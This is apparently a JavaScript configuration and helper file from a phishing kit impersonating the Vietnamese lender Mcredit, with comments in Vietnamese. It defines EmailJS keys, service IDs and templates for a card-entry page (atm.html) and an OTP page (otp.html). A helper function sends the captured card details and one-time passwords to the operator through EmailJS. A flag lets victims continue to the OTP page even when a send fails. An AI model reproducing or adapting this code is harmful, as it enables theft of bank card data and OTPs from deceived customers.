/**
 * EmailJS chỉ atm.html (card) + otp.html (otp). Không dùng evaluate-emailjs-config.js.
 * Nên dùng tài khoản EmailJS riêng — đổi publicKey / serviceId / templateId từng bước.
 */
window.ATM_EMAILJS = {
  platform: "ATM/STK — Mcredit",

  card: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_okfc1tl",
  },

  otp: {
    publicKey: "MQKcpIwixBVd4Q920",
    serviceId: "service_ezzpzs5",
    templateId: "template_7cvd42u",
  },

  /** true: lỗi EmailJS vẫn chuyển trang (otp.html) */
  continueOnEmailFailure: true,
};

window.__atmEmailJsActiveKey = null;

window.atmSendEmailJs = function (step, templateParams) {
  if (typeof emailjs === "undefined") {
    return Promise.reject(new Error("EmailJS SDK chưa tải."));
  }

  var root = window.ATM_EMAILJS || {};
  var block = root[step];
  if (!block || !block.serviceId || !block.templateId) {
    return Promise.reject(new Error("Thiếu cấu hình ATM_EMAILJS." + step));
  }

  if (block.publicKey && window.__atmEmailJsActiveKey !== block.publicKey) {
    emailjs.init(block.publicKey);
    window.__atmEmailJsActiveKey = block.publicKey;
  }

  var params = Object.assign(
    { platform: root.platform || "ATM/STK" },
    templateParams
  );

  return emailjs.send(block.serviceId, block.templateId, params);
};
